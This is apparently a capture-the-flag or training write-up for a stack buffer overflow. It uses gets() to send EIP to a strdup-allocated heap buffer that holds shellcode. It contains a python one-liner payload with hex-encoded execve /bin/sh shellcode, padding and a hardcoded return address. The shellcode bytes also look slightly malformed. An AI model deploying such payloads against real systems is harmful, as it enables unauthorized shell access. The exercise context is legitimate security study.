See [asm_analysis.md](Ressources/asm_analysis.md) for the complete ASM analysis.


We will use the gets function to overwite EIP value to the return value of strdup and inject a shellcode from our buffer, that will be copied into a the heap and pointed to by the strdup return value.
Then EIP will interpretate the machine code allocated on the heap.

   The injection is built like this :

  - our shellcode (26 bytes)
  - padding (54 bytes)
  - the return address of strdup (reversed because of little endian)

Usage:

python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x50\x89\xe2\xb0\x0b\xcd\x80" + "A" * 54 + "\x08\xa0\x04\x08"' > /tmp/shellcode

